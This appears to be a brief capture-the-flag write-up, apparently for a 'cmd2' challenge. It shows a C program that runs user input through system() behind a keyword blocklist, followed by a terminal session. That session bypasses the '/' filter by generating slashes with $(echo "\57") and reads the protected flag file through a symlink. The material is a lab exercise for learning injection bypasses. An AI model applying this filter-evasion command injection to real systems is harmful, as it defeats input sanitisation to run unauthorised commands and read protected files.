```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```
쉘 스크립트의 특성 
cmd2@ubuntu:~$ mkdir /tmp/cmd2k
cmd2@ubuntu:~$ cd /tmp/cmd2k
cmd2@ubuntu:/tmp/cmd2k$ ln -s /home/cmd2/cmd2 cmd2
cmd2@ubuntu:/tmp/cmd2k$ ln -s /home/cmd2/flag f
cmd2@ubuntu:/tmp/cmd2k$ ./cmd2 '$(echo "\57")bin$(echo "\57")cat f'
